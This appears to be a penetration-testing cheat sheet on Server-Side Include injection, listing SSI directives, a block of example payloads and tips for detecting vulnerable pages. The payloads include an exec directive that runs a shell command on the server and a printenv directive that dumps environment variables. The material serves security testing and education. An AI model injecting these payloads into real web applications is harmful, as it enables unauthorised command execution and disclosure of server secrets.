
## Primary SSI directives 

- **config** : The config command is a control directive to modify various SSI components. Includes parameters such as the default server error message (errmsg), file size format (sizefmt), and the date & time format (timefmt)

- **echo** : Inserts SSI and CGI environment variables values while including optional encoding arguments.

- **exec** : Executes an external application, following which the execution output is inserted into the document. This control directive supports cmd arguments from any client app or a cgi program.

- **flastmod**: The last time and date a specified file was modified. It accepts both a virtual path (virtual) and a relative pathname (file) as arguments for locating the document on the server.

- **include**:  Inserts text from another document into the current file. It also accepts file and virtual arguments to locate the document.

- **printenv**  Displays all environment variables within the server.

- **set** : A control directive that sets a server-side variable to the specified value.

## Payloads 

``` 
<!--#echo var="DATE_LOCAL" -->

// Modification date of a file
<!--#flastmod file="index.html" -->

// CGI Program results
<!--#include virtual="/cgi-bin/counter.pl" -->

// Including a footer
<!--#include virtual="/footer.html" -->

// Executing commands
<!--#exec cmd="ls" -->

// Setting variables
<!--#set var="name" value="Rich" -->

// Including virtual files (same directory)
<!--#include virtual="file_to_include.html" -->

// Including files (same directory)
<!--#include file="file_to_include.html" -->

// Print all variables
<!--#printenv -->
```


## Detection 

- checking for extensions such as .shtml, .shtm, or .stm. That said, non-default server configurations exist that could allow other extensions (such as .html) to process SSI directives.

- It is possible to check if the application is properly validating input fields data by inserting characters that are used in SSI directives, like:
< ! # = / . " - > and [a-zA-Z0-9]
